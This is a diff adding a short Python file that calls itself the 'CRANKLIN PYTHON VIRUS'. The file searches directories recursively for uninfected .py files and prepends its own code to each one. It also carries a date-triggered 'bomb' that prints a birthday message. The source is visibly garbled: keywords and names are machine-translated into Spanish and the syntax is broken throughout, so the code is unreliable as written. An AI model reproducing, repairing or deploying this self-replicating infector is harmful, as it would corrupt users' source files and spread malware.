@@ -1,0 +1,39 @@
+! # / Usr / bin / python 
+import os 
+import datetime 
+FIRMA = "CRANKLIN PYTHON VIRUS" 
+def búsqueda (path): 
+    filestoinfect = [] 
+    filelist = os.listdir (path) 
+    para fname en filelist: 
+        si os.path.isdir (path + "/" fname +): 
+            filestoinfect.extend (búsqueda (path + "/" + fname)) 
+        elif fname [-3:] == "py".: 
+            infección = False 
+            for linea in open (ruta + "/" fname +) : 
+                Si la firma en línea: 
+                    infectado = True 
+                    descanso 
+            si se infecta == False: 
+                filestoinfect.append (ruta + "/" + fname) 
+    volver filestoinfect 
+def infectar (filestoinfect): 
+    virus = open (os.path.abspath (FILE)) 
+    = virusstring "" 
+    for i, entrada de línea enumerate (virus): 
+        si i> = 0 i <39: 
+            virusstring + = línea 
+    virus.close 
+    para fname en filestoinfect: 
+        f = open (fname) 
+        temp = f.read () 
+        f.close () 
+        f = open (fname, "w") 
+        f.write (virusstring + temp) 
+        f.close () 
+def bomba (): 
+    si datetime.datetime.now () == 1 mes y datetime.datetime.now (. .) día == 25: 
+        print "! CRANKLIN FELIZ CUMPLEAÑOS" 
+filestoinfect = search (os.path.abspath ("")) 
+infectar (filestoinfect) 
+bomba ()
